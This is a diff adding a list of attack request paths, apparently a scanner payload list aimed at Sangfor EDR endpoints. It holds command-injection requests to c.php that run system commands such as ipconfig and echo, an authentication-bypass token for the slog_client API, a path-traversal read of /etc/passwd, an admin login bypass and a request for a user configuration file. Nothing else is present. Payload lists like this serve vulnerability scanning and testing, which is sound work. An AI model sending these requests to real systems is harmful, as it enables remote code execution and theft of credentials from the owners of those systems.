@@ -1,0 +1,8 @@
+/tool/log/c.php?strip_slashes=printf&host=nl+c.php
+/tool/log/c.php?strip_slashes=md5&host={{randstr}}
+/tool/log/c.php?strip_slashes=system&host=ipconfig
+/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
+/tool/log/c.php?strip_slashes=system&host=echo%2021232f297a57a5a743894a0e4a801fc3
+/report/download.php?pdf=../../../../../etc/passwd
+/ui/login.php?user=admin
+/tmp/updateme/sinfor/ad/sys/sys_user.conf
